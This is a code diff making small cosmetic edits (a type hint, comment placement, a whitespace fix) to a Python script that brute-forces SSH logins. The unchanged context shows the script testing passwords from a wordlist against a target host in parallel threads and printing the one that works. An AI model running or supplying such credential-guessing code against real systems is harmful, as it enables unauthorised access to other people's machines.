@@ -15,7 +15,7 @@ Found = False
 Fails = 0
 
 
-def connect(host, user, password, release):
+def connect(host, user, password, release: bool):
     """Wrapper for pxssh to connect to remote host via ssh
 
     :param host: hostname of the target
@@ -30,8 +30,8 @@ def connect(host, user, password, release):
         s = pxssh.pxssh()
         s.login(host, user, password)
         print(
-            f"[+] Password Found: {password}"
-        )  # lgtm [py/clear-text-logging-sensitive-data]
+            f"[+] Password Found: {password}"  # lgtm [py/clear-text-logging-sensitive-data]
+        )
         Found = True
     except Exception as e:
         if "read_nonblocking" in str(e):
@@ -68,7 +68,7 @@ def main():
         default="passwordlist.txt",
         action="store",
         dest="passfile",
-        help="The    password list to reference.",
+        help="The password list to reference.",
     )
 
     args = parser.parse_args()
@@ -92,8 +92,8 @@ def main():
             connection_lock.acquire()
             password = line.strip("\r").strip("\n")
             print(
-                f"[-] Testing: {password}"
-            )  # lgtm [py/clear-text-logging-sensitive-data]
+                f"[-] Testing: {password}"  # lgtm [py/clear-text-logging-sensitive-data]
+            )
             t = Thread(target=connect, args=(host, user, password, True))
             t.start()
             threads.append(t)
